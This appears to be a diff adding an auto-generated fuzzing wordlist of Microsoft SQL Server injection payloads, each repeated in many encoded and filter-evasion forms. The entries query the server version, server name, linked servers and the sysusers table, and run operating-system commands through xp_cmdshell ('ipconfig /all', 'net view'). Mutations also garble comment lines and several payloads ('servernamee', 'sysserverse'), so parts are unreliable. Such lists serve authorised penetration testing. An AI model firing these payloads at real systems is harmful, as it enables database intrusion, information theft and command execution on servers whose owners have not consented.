@@ -1,0 +1,997 @@
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+%00
+IyBtcy1zcWxpIGluZm8gZGlzY2xvc3VyZSBwYXlsb2FkIGZ1enpmaWxlCg==
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+%2523%2520%256D%2573%252D%2573%2571%256C%2569%2520%2569%256E%2566%256F%2520%2564%2569%2573%2563%256C%256F%2573%2575%2572%2565%2520%2570%2561%2579%256C%256F%2561%2564%2520%2566%2575%257A%257A%2566%2569%256C%2565%250A
+%23%20%6D%73%2D%73%71%6C%69%20%69%6E%66%6F%20%64%69%73%63%6C%6F%73%75%72%65%20%70%61%79%6C%6F%61%64%20%66%75%7A%7A%66%69%6C%65%0A
+%u0023%u0020%u006D%u0073%u002D%u0073%u0071%u006C%u0069%u0020%u0069%u006E%u0066%u006F%u0020%u0064%u0069%u0073%u0063%u006C%u006F%u0073%u0075%u0072%u0065%u0020%u0070%u0061%u0079%u006C%u006F%u0061%u0064%u0020%u0066%u0075%u007A%u007A%u0066%u0069%u006C%u0065%u000A
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+%C0%AB%C0%AAms%C0%AFsqli%C0%AAinfo%C0%AAdisclosure%C0%AApayload%C0%AAfuzzfile%C0%8A
+%# %m%s%-%s%q%l%i %i%n%f%o %d%i%s%c%l%o%s%u%r%e %p%a%y%l%o%a%d %f%u%z%z%f%i%l%e%
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+ and '0having'='0having'
+# ms-sqli info disclosure payload fuzzfile
+sp_password
+#/**/ms-sqli/**/info/**/disclosure/**/payload/**/fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+#%03ms-sqli%08info%0Adisclosure%09payload%0Ffuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+#%09ms-sqli%0Binfo%0Ddisclosure%0Dpayload%0Cfuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+#+ms-sqli+info+disclosure+payload+fuzzfile
+
+#%0Dms-sqli%0Ainfo%0Adisclosure%0Apayload%0Dfuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# ms-sqli info disclosure payload fuzzfile
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+%00
+IyByZXBsYWNlIHJlZ2V4IHdpdGggeW91ciBmdXp6ZXIgZm9yIGJlc3QgcmVzdWx0cyA8YXR0YWNrZXJpcD4gPHNoYXJlbmFtZT4K
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+%2523%2520%2572%2565%2570%256C%2561%2563%2565%2520%2572%2565%2567%2565%2578%2520%2577%2569%2574%2568%2520%2579%256F%2575%2572%2520%2566%2575%257A%257A%2565%2572%2520%2566%256F%2572%2520%2562%2565%2573%2574%2520%2572%2565%2573%2575%256C%2574%2573%2520%253C%2561%2574%2574%2561%2563%256B%2565%2572%2569%2570%253E%2520%253C%2573%2568%2561%2572%2565%256E%2561%256D%2565%253E%250A
+%23%20%72%65%70%6C%61%63%65%20%72%65%67%65%78%20%77%69%74%68%20%79%6F%75%72%20%66%75%7A%7A%65%72%20%66%6F%72%20%62%65%73%74%20%72%65%73%75%6C%74%73%20%3C%61%74%74%61%63%6B%65%72%69%70%3E%20%3C%73%68%61%72%65%6E%61%6D%65%3E%0A
+%u0023%u0020%u0072%u0065%u0070%u006C%u0061%u0063%u0065%u0020%u0072%u0065%u0067%u0065%u0078%u0020%u0077%u0069%u0074%u0068%u0020%u0079%u006F%u0075%u0072%u0020%u0066%u0075%u007A%u007A%u0065%u0072%u0020%u0066%u006F%u0072%u0020%u0062%u0065%u0073%u0074%u0020%u0072%u0065%u0073%u0075%u006C%u0074%u0073%u0020%u003C%u0061%u0074%u0074%u0061%u0063%u006B%u0065%u0072%u0069%u0070%u003E%u0020%u003C%u0073%u0068%u0061%u0072%u0065%u006E%u0061%u006D%u0065%u003E%u000A
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+%C0%AB%C0%AAreplace%C0%AAregex%C0%AAwith%C0%AAyour%C0%AAfuzzer%C0%AAfor%C0%AAbest%C0%AAresults%C0%AA%C0%BEattackerip%C0%BE%C0%AA%C0%BEsharename%C0%BE%C0%8A
+%# %r%e%p%l%a%c%e %r%e%g%e%x %w%i%t%h %y%o%u%r %f%u%z%z%e%r %f%o%r %b%e%s%t %r%e%s%u%l%t%s %<%a%t%t%a%c%k%e%r%i%p%> %<%s%h%a%r%e%n%a%m%e%>%
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+ and '0having'='0having'
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+sp_password
+#/**/replace/**/regex/**/with/**/your/**/fuzzer/**/for/**/best/**/results/**/<attackerip>/**/<sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+#%0Dreplace%0Cregex%04with%01your%0Ffuzzer%0Efor%0Ebest%0Eresults%0D<attackerip>%05<sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+#%0Breplace%0Aregex%0Cwith%0Byour%0Cfuzzer%0Cfor%0Abest%0Bresults%0D<attackerip>%09<sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+#+replace+regex+with+your+fuzzer+for+best+results+<attackerip>+<sharename>
+
+#%09replace%0Aregex%0Awith%09your%0Cfuzzer%09for%09best%0Dresults%09<attackerip>%0A<sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# replace regex with your fuzzer for best results <attackerip> <sharename>
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+%00
+IyBydW4gd2lyZXNoYXJrIG9yIHRjcGR1bXAsIGxvb2sgZm9yIGluY29taW5nIHNtYiBvciBpY21wIHBhY2tldHMgZnJvbSB2aWN0aW0K
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+%2523%2520%2572%2575%256E%2520%2577%2569%2572%2565%2573%2568%2561%2572%256B%2520%256F%2572%2520%2574%2563%2570%2564%2575%256D%2570%252C%2520%256C%256F%256F%256B%2520%2566%256F%2572%2520%2569%256E%2563%256F%256D%2569%256E%2567%2520%2573%256D%2562%2520%256F%2572%2520%2569%2563%256D%2570%2520%2570%2561%2563%256B%2565%2574%2573%2520%2566%2572%256F%256D%2520%2576%2569%2563%2574%2569%256D%250A
+%23%20%72%75%6E%20%77%69%72%65%73%68%61%72%6B%20%6F%72%20%74%63%70%64%75%6D%70%2C%20%6C%6F%6F%6B%20%66%6F%72%20%69%6E%63%6F%6D%69%6E%67%20%73%6D%62%20%6F%72%20%69%63%6D%70%20%70%61%63%6B%65%74%73%20%66%72%6F%6D%20%76%69%63%74%69%6D%0A
+%u0023%u0020%u0072%u0075%u006E%u0020%u0077%u0069%u0072%u0065%u0073%u0068%u0061%u0072%u006B%u0020%u006F%u0072%u0020%u0074%u0063%u0070%u0064%u0075%u006D%u0070%u002C%u0020%u006C%u006F%u006F%u006B%u0020%u0066%u006F%u0072%u0020%u0069%u006E%u0063%u006F%u006D%u0069%u006E%u0067%u0020%u0073%u006D%u0062%u0020%u006F%u0072%u0020%u0069%u0063%u006D%u0070%u0020%u0070%u0061%u0063%u006B%u0065%u0074%u0073%u0020%u0066%u0072%u006F%u006D%u0020%u0076%u0069%u0063%u0074%u0069%u006D%u000A
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets FROFROMM victim
+
+%C0%AB%C0%AArun%C0%AAwireshark%C0%AAor%C0%AAtcpdump%C0%AE%C0%AAlook%C0%AAfor%C0%AAincoming%C0%AAsmb%C0%AAor%C0%AAicmp%C0%AApackets%C0%AAfrom%C0%AAvictim%C0%8A
+%# %r%u%n %w%i%r%e%s%h%a%r%k %o%r %t%c%p%d%u%m%p%, %l%o%o%k %f%o%r %i%n%c%o%m%i%n%g %s%m%b %o%r %i%c%m%p %p%a%c%k%e%t%s %f%r%o%m %v%i%c%t%i%m%
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+ and '0having'='0having'
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+sp_password
+#/**/run/**/wireshark/**/or/**/tcpdump,/**/look/**/for/**/incoming/**/smb/**/or/**/icmp/**/packets/**/from/**/victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+#%02run%01wireshark%0Aor%0Btcpdump,%06look%09for%0Dincoming%03smb%0Cor%0Bicmp%09packets%01from%05victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+#%0Crun%09wireshark%0Aor%0Atcpdump,%0Blook%0Bfor%09incoming%0Asmb%0Aor%0Dicmp%09packets%0Dfrom%0Avictim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+#+run+wireshark+or+tcpdump,+look+for+incoming+smb+or+icmp+packets+from+victim
+
+#%0Crun%0Cwireshark%0Cor%09tcpdump,%0Alook%0Afor%09incoming%0Asmb%0Dor%0Cicmp%0Apackets%09from%0Avictim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# run wireshark or tcpdump, look for incoming smb or icmp packets from victim
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+%00
+IyBtaWdodCBuZWVkIHRvIHRlcm1pbmF0ZSBwYXlsb2FkcyB3aXRoIDstLQo=
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+%2523%2520%256D%2569%2567%2568%2574%2520%256E%2565%2565%2564%2520%2574%256F%2520%2574%2565%2572%256D%2569%256E%2561%2574%2565%2520%2570%2561%2579%256C%256F%2561%2564%2573%2520%2577%2569%2574%2568%2520%253B%252D%252D%250A
+%23%20%6D%69%67%68%74%20%6E%65%65%64%20%74%6F%20%74%65%72%6D%69%6E%61%74%65%20%70%61%79%6C%6F%61%64%73%20%77%69%74%68%20%3B%2D%2D%0A
+%u0023%u0020%u006D%u0069%u0067%u0068%u0074%u0020%u006E%u0065%u0065%u0064%u0020%u0074%u006F%u0020%u0074%u0065%u0072%u006D%u0069%u006E%u0061%u0074%u0065%u0020%u0070%u0061%u0079%u006C%u006F%u0061%u0064%u0073%u0020%u0077%u0069%u0074%u0068%u0020%u003B%u002D%u002D%u000A
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+%C0%AB%C0%AAmight%C0%AAneed%C0%AAto%C0%AAterminate%C0%AApayloads%C0%AAwith%C0%AA%C0%BB%C0%AF%C0%AF%C0%8A
+%# %m%i%g%h%t %n%e%e%d %t%o %t%e%r%m%i%n%a%t%e %p%a%y%l%o%a%d%s %w%i%t%h %;%-%-%
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+ and '0having'='0having'
+# might need to terminate payloads with ;--
+sp_password
+#/**/might/**/need/**/to/**/terminate/**/payloads/**/with/**/;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+#%0Dmight%0Cneed%0Fto%01terminate%0Cpayloads%0Cwith%09;--
+
+# might need to terminate payloads with ;--
+
+#%09might%09need%0Ato%0Bterminate%0Dpayloads%09with%0C;--
+
+# might need to terminate payloads with ;--
+
+#+might+need+to+terminate+payloads+with+;--
+
+#%0Amight%0Aneed%0Cto%0Cterminate%09payloads%0Dwith%0C;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+# might need to terminate payloads with ;--
+
+select @@version
+
+select @@version
+
+select @@version
+%00
+c2VsZWN0IEBAdmVyc2lvbgo=
+select @@version
+
+select @@version
+
+%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%250A
+%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u000A
+select @@version
+
+select @@version
+
+select @@version
+
+select @@version
+
+select @@version
+
+select @@version
+
+select /*!30105@@version
+*/
+select /*!00000@@version
+*/
+select @@version
+
+SELECSELECTT @@version
+
+select%C0%AA%C0%CA%C0%CAversion%C0%8A
+%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%
+
+select @@version
+
+select @@version
+
+select @@version
+ and '0having'='0having'
+select @@version
+-- sp_password
+select/**/@@version
+
+select--TnhBLFHA%0A@@version--sYWdIUBLnwn%0A
+select%23nClcxHqdZ%0A@@version%23TarjvlNz%0A
+select%23qXQSqzrwq%0A@@version%23uEgSHHSHRgKN%0A
+select%01@@version
+
+select%23%0A@@version%23%0A
+select%0C@@version
+
+select--%0A@@version--%0A
+select+@@version
+
+select%0D@@version
+
+select @@version
+
+select @@version
+
+select @@version
+
+select @@version
+
+select @@version
+
+select @@version
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+%00
+c2VsZWN0IEBAc2VydmVybmFtZWUK
+select @@servernamee
+
+select @@servernamee
+
+%2573%2565%256C%2565%2563%2574%2520%2540%2540%2573%2565%2572%2576%2565%2572%256E%2561%256D%2565%2565%250A
+%73%65%6C%65%63%74%20%40%40%73%65%72%76%65%72%6E%61%6D%65%65%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0073%u0065%u0072%u0076%u0065%u0072%u006E%u0061%u006D%u0065%u0065%u000A
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select /*!30125@@servernamee
+*/
+select /*!00000@@servernamee
+*/
+select @@servernamee
+
+SSELECTELECT @@servernamee
+
+select%C0%AA%C0%CA%C0%CAservernamee%C0%8A
+%s%e%l%e%c%t %@%@%s%e%r%v%e%r%n%a%m%e%e%
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+ and '0having'='0having'
+select @@servernamee
+-- sp_password
+select/**/@@servernamee
+
+select--YkqPQpqbp%0A@@servernamee--nKhQaQM%0A
+select%23mfvEqS%0A@@servernamee%23DMRRpuC%0A
+select%23iMlEmaGl%0A@@servernamee%23hgIcsFcubS%0A
+select%02@@servernamee
+
+select%23%0A@@servernamee%23%0A
+select%09@@servernamee
+
+select--%0A@@servernamee--%0A
+select+@@servernamee
+
+select%0A@@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@servernamee
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+%00
+c2VsZWN0IEBAbWljcm9zb2Z0dmVyc2lvbmUK
+select @@microsoftversione
+
+select @@microsoftversione
+
+%2573%2565%256C%2565%2563%2574%2520%2540%2540%256D%2569%2563%2572%256F%2573%256F%2566%2574%2576%2565%2572%2573%2569%256F%256E%2565%250A
+%73%65%6C%65%63%74%20%40%40%6D%69%63%72%6F%73%6F%66%74%76%65%72%73%69%6F%6E%65%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u006D%u0069%u0063%u0072%u006F%u0073%u006F%u0066%u0074%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0065%u000A
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select /*!30143@@microsoftversione
+*/
+select /*!00000@@microsoftversione
+*/
+select @@microsoftversione
+
+SELSELECTECT @@microsoftversione
+
+select%C0%AA%C0%CA%C0%CAmicrosoftversione%C0%8A
+%s%e%l%e%c%t %@%@%m%i%c%r%o%s%o%f%t%v%e%r%s%i%o%n%e%
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+ and '0having'='0having'
+select @@microsoftversione
+-- sp_password
+select/**/@@microsoftversione
+
+select--PqVwVxrmAP%0A@@microsoftversione--vqoGyPTDHh%0A
+select%23MrRPLYtn%0A@@microsoftversione%23woUYrqQJxa%0A
+select%23aiMZxW%0A@@microsoftversione%23uZkheEr%0A
+select%06@@microsoftversione
+
+select%23%0A@@microsoftversione%23%0A
+select%0B@@microsoftversione
+
+select--%0A@@microsoftversione--%0A
+select+@@microsoftversione
+
+select%0A@@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select @@microsoftversione
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+%00
+c2VsZWN0ICogZnJvbSBtYXN0ZXIuLnN5c3NlcnZlcnNlCg==
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%256D%2561%2573%2574%2565%2572%252E%252E%2573%2579%2573%2573%2565%2572%2576%2565%2572%2573%2565%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%6D%61%73%74%65%72%2E%2E%73%79%73%73%65%72%76%65%72%73%65%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u006D%u0061%u0073%u0074%u0065%u0072%u002E%u002E%u0073%u0079%u0073%u0073%u0065%u0072%u0076%u0065%u0072%u0073%u0065%u000A
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select /*!30922* from master..sysserverse
+*/
+select /*!00000* from master..sysserverse
+*/
+select * from master..sysserverse
+
+SSELECTELECT * FROFROMM master..sysserverse
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AAmaster%C0%AE%C0%AEsysserverse%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %m%a%s%t%e%r%.%.%s%y%s%s%e%r%v%e%r%s%e%
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+ and '0having'='0having'
+select * from master..sysserverse
+-- sp_password
+select/**/*/**/from/**/master..sysserverse
+
+select--mPgEzD%0A*--GPGSyyPl%0Afrom--hQhEFaJNeGgH%0Amaster..sysserverse--hSJUolLr%0A
+select%23OWJXIPVxJH%0A*%23tHbDnUNeSHij%0Afrom%23fneYdlo%0Amaster..sysserverse%23BTKGUNOYt%0A
+select%23kcCrQl%0A*%23CbSJFg%0Afrom%23iasaQDNRwyqp%0Amaster..sysserverse%23USnJPJ%0A
+select%0D*%0Ffrom%0Fmaster..sysserverse
+
+select%23%0A*%23%0Afrom%23%0Amaster..sysserverse%23%0A
+select%0C*%0Bfrom%0Dmaster..sysserverse
+
+select--%0A*--%0Afrom--%0Amaster..sysserverse--%0A
+select+*+from+master..sysserverse
+
+select%0D*%0Dfrom%0Dmaster..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from master..sysserverse
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+%00
+c2VsZWN0ICogZnJvbSBzeXN1c2Vycwo=
+select * from sysusers
+
+select * from sysusers
+
+%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%2573%2579%2573%2575%2573%2565%2572%2573%250A
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%73%79%73%75%73%65%72%73%0A
+%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u0073%u0079%u0073%u0075%u0073%u0065%u0072%u0073%u000A
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select /*!30321* from sysusers
+*/
+select /*!00000* from sysusers
+*/
+select * from sysusers
+
+SSELECTELECT * FRFROMOM sysusers
+
+select%C0%AA%C0%AA%C0%AAfrom%C0%AAsysusers%C0%8A
+%s%e%l%e%c%t %* %f%r%o%m %s%y%s%u%s%e%r%s%
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+ and '0having'='0having'
+select * from sysusers
+-- sp_password
+select/**/*/**/from/**/sysusers
+
+select--JsSSuBZoz%0A*--ABwZXAGvPujP%0Afrom--AiKGIuytpuu%0Asysusers--xwyxdjbgi%0A
+select%23BcJqfR%0A*%23SrPmiWaKaot%0Afrom%23RqQMuZJmCpoK%0Asysusers%23egJlQwuIb%0A
+select%23jNAzQbm%0A*%23mnrHulyNjCj%0Afrom%23cpDuGoNIQU%0Asysusers%23bXqwuz%0A
+select%0D*%02from%09sysusers
+
+select%23%0A*%23%0Afrom%23%0Asysusers%23%0A
+select%0D*%09from%0Asysusers
+
+select--%0A*--%0Afrom--%0Asysusers--%0A
+select+*+from+sysusers
+
+select%0C*%0Afrom%0Dsysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+select * from sysusers
+
+exec master..xp_cmdshell %EF%BC%87ipconfig+/all%EF%BC%87	
+
+exec master..xp_cmdshell %00%27ipconfig+/all%00%27	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+%00
+ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdpcGNvbmZpZysvYWxsJwkK
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+%2565%2578%2565%2563%2520%256D%2561%2573%2574%2565%2572%252E%252E%2578%2570%255F%2563%256D%2564%2573%2568%2565%256C%256C%2520%2527%2569%2570%2563%256F%256E%2566%2569%2567%252B%252F%2561%256C%256C%2527%2509%250A
+%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%63%6D%64%73%68%65%6C%6C%20%27%69%70%63%6F%6E%66%69%67%2B%2F%61%6C%6C%27%09%0A
+%u0065%u0078%u0065%u0063%u0020%u006D%u0061%u0073%u0074%u0065%u0072%u002E%u002E%u0078%u0070%u005F%u0063%u006D%u0064%u0073%u0068%u0065%u006C%u006C%u0020%u0027%u0069%u0070%u0063%u006F%u006E%u0066%u0069%u0067%u002B%u002F%u0061%u006C%u006C%u0027%u0009%u000A
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec /*!30774master..xp_cmdshell 'ipconfig+/all'	
+*/
+exec /*!00000master..xp_cmdshell 'ipconfig+/all'	
+*/
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec%C0%AAmaster%C0%AE%C0%AExp%C0%DFcmdshell%C0%AA%C0%AFipconfig%C0%AB%C0%AFall%C0%AF%C0%8B%C0%8A
+%e%x%e%c %m%a%s%t%e%r%.%.%x%p%_%c%m%d%s%h%e%l%l %'%i%p%c%o%n%f%i%g%+%/%a%l%l%'%	%
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+ and '0having'='0having'
+exec master..xp_cmdshell 'ipconfig+/all'	
+-- sp_password
+exec/**/master..xp_cmdshell/**/'ipconfig+/all'	
+
+exec--aWokqd%0Amaster..xp_cmdshell--BKiSFnRh%0A'ipconfig+/all'--ySaKhSxrL%0A--TPIJzGlLzSEZ%0A
+exec%23gTmXnURfl%0Amaster..xp_cmdshell%23NRCsBLZ%0A'ipconfig+/all'%23lvUrWvoPeJ%0A%23btySwOajuP%0A
+exec%23jCCQRbzUr%0Amaster..xp_cmdshell%23NvwJpl%0A'ipconfig+/all'%23jjaDkxZ%0A%23IpaXhft%0A
+exec%0Dmaster..xp_cmdshell%04'ipconfig+/all'	
+
+exec%23%0Amaster..xp_cmdshell%23%0A'ipconfig+/all'%23%0A%23%0A
+exec%0Dmaster..xp_cmdshell%09'ipconfig+/all'	
+
+exec--%0Amaster..xp_cmdshell--%0A'ipconfig+/all'--%0A--%0A
+exec+master..xp_cmdshell+'ipconfig+/all'	
+
+exec%0Amaster..xp_cmdshell%0D'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell %bf%27ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell 'ipconfig+/all'	
+
+exec master..xp_cmdshell %EF%BC%87net+view%EF%BC%87
+
+exec master..xp_cmdshell %00%27net+view%00%27
+
+exec master..xp_cmdshell 'net+view'
+%00
+ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICduZXQrdmlldycK
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+%2565%2578%2565%2563%2520%256D%2561%2573%2574%2565%2572%252E%252E%2578%2570%255F%2563%256D%2564%2573%2568%2565%256C%256C%2520%2527%256E%2565%2574%252B%2576%2569%2565%2577%2527%250A
+%65%78%65%63%20%6D%61%73%74%65%72%2E%2E%78%70%5F%63%6D%64%73%68%65%6C%6C%20%27%6E%65%74%2B%76%69%65%77%27%0A
+%u0065%u0078%u0065%u0063%u0020%u006D%u0061%u0073%u0074%u0065%u0072%u002E%u002E%u0078%u0070%u005F%u0063%u006D%u0064%u0073%u0068%u0065%u006C%u006C%u0020%u0027%u006E%u0065%u0074%u002B%u0076%u0069%u0065%u0077%u0027%u000A
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec master..xp_cmdshell 'net+view'
+
+exec /*!30553master..xp_cmdshell 'net+view'
+*/
+exec /*!00000master..xp_cmdshell 'net+view'
+*/
